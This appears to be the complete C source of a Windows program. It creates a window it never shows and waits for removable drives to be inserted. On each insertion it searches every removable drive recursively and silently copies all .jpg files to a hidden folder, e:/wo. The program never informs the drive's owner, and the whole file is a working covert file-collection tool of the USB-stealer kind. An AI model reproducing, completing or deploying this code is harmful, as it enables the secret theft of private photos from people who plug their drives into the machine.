#include<windows.h>
#include<stdio.h>
#include<dbt.h>
#define BUFSIZE 1024

void jianchacipan();
void findjia(LPSTR jiapath);
void findjpg(LPSTR jpgpath);
void fuzhi(LPSTR fupath,LPSTR name);

LRESULT CALLBACK MyWndProc(
  HWND hwnd,      // handle to window
  UINT uMsg,      // message identifier
  WPARAM wParam,  // first message parameter
  LPARAM lParam   // second message parameter
);

int WINAPI WinMain(HINSTANCE hInstance,
				   HINSTANCE hPreInstance,
				   LPSTR IpCmdLine,
				   int nShowCmd)
{
	HWND hwnd;
	WNDCLASS wnd;
	MSG msg;
	wnd.style = CS_HREDRAW | CS_VREDRAW;
	wnd.lpfnWndProc = MyWndProc;
	wnd.cbClsExtra = 0;
	wnd.cbWndExtra = 0;
	wnd.hIcon = LoadIcon(NULL,IDI_APPLICATION);
	wnd.hCursor = LoadCursor(NULL,IDC_ARROW);
	wnd.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);
	wnd.lpszMenuName = NULL;
	wnd.lpszClassName = TEXT("第一个窗口");
	wnd.hInstance = hInstance;
	if(!RegisterClass(&wnd))
	{
		MessageBox(NULL,"register file","erro Msg",0);
		return 0;
	}
	hwnd= CreateWindow(TEXT("第一个窗口"),TEXT("我的窗口"),WS_OVERLAPPEDWINDOW,0,0,400,300,NULL,NULL,hInstance,NULL);
	while(GetMessage(&msg,NULL,0,0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	return msg.lParam;
}


LRESULT CALLBACK MyWndProc(
	HWND hwnd,      // handle to window
	UINT uMsg,      // message identifier
	WPARAM wParam,  // first message parameter
	LPARAM lParam   // second message parameter
)

{
	switch(uMsg)
	{	
	case WM_DEVICECHANGE:// 插入磁盘响应消息
		if(DBT_DEVICEARRIVAL==(UINT)wParam)
		{
		CreateDirectory("e:/wo",NULL);
		jianchacipan();
		}
		return 0;
	case WM_DESTROY:
		PostQuitMessage(0);
			return 0;
	}

	return DefWindowProc(hwnd,uMsg,wParam,lParam);
}



void jianchacipan()//查找磁盘
{
	CHAR cun[BUFSIZE];
	PCHAR szDrive;
	ZeroMemory(cun,BUFSIZE);
	GetLogicalDriveStrings(BUFSIZE-1,cun);
	szDrive=(PCHAR)cun;
	do
	{
		if(GetDriveType(szDrive)==DRIVE_REMOVABLE)//获得磁盘
		{
			findjia(szDrive);
		}

		szDrive+=(lstrlen(szDrive)+1);
	}
	while(*szDrive!='\x00');
}




//查找文件夹
void findjia(LPSTR jiapath)
{
	WIN32_FIND_DATA filedate;
	HANDLE filejubing;
	CHAR path[MAX_PATH];
	CHAR path1[MAX_PATH];
	lstrcpy(path,jiapath);
	lstrcat(path,"\\*");
	findjpg(jiapath);
	filejubing=FindFirstFile(path,&filedate);
	if(filejubing==INVALID_HANDLE_VALUE)
	{
		printf("没有找到\n");
	}
	else
	{
		do
		{
			if(lstrcmp(filedate.cFileName,TEXT("."))==0||lstrcmp(filedate.cFileName,TEXT(".."))==0)
				{continue;}
			if(filedate.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY)
			{		
				wsprintf(path1,"%s\\%s",jiapath,filedate.cFileName);
				findjia(path1);
				if(!(filedate.dwFileAttributes&FILE_ATTRIBUTE_DIRECTORY))
				{
					findjpg(path1);
				}
			}
		}
		while(FindNextFile(filejubing,&filedate));
	}
}
//查找所有文件夹里的文件
void findjpg(LPSTR jpgpath)     
{
	int b=0;
	WIN32_FIND_DATA filedate;
	HANDLE filejubing;
	CHAR szpath[MAX_PATH];
	CHAR szpath1[MAX_PATH];
	lstrcpy(szpath,jpgpath);
	lstrcat(szpath,"\\*.jpg");
	filejubing=FindFirstFile(szpath,&filedate);
	if(filejubing==INVALID_HANDLE_VALUE)
	{
		//printf("没有找到\n");
	}
	else
	{
		do
		{
			if(lstrcmp(filedate.cFileName,TEXT("."))==0||lstrcmp(filedate.cFileName,TEXT(".."))==0)
				{continue;}
			wsprintf(szpath1,"%s\\%s",jpgpath,filedate.cFileName);

			fuzhi(szpath1,filedate.cFileName);
		}
		while(FindNextFile(filejubing,&filedate));
	}
}


void fuzhi(LPSTR fupath,LPSTR name)//开始复制
{
	CHAR path3[MAX_PATH];
	wsprintf(path3,"%s\\%s","e:/wo",name);

	if(CopyFile(fupath,path3,FALSE)==FALSE)
	{
		//复制失败
	}
}

